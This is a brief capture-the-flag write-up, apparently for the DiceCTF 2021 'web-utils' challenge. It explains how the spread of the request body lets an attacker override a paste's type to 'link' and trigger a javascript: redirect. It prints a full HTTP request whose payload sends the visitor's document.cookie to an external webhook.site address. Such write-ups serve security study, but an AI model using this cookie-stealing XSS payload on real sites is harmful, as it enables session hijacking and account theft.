My friend made this dumb tool; can you try and steal his cookies? If you send me a link, I can pass it along.




root@kali:~/Documents/DiceCTF/2021/web-web-utils# cat exploit.txt
The view page has the following problem:

if (type === 'link') return window.location = data;


However the link page only allows you to submit URL (regex). So we need to bypass the paste page and create a link from there.
Luckly they have explode the req.body like so:

database.addData({ type: 'paste', ...req.body, uid });

Allowing us to send a type to override the "paste".

See request below.

Burp request:


POST /api/createPaste HTTP/1.1
Host: web-utils.dicec.tf
Connection: close
Content-Length: 134
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://web-utils.dicec.tf
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://web-utils.dicec.tf/pastes/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"data":"javascript:document.location='https://webhook.site/768da366-9c5e-4d86-9140-8afb55ccbd1b?c='+document.cookie","type":"link"}


Once created, submit the link to admin /view/XXXX and the callback will go on webhook.site with the cookie as query param
root@kali:~/Documents/DiceCTF/2021/web-web-utils#
